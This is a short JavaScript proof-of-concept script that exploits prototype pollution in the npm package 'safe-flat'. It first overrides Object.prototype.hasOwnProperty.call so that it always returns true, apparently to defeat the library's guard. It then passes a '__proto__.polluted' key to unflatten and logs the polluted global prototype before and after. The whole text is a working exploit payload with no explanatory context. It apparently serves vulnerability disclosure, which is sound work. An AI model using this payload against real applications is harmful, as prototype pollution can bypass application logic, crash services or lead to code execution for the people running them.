Object.prototype.hasOwnProperty.call = () => true;
var safeFlat = require('safe-flat');
obj = {};
console.log({}.polluted);
safeFlat.unflatten({ '__proto__.polluted': 'yes' }, '.');
console.log({}.polluted);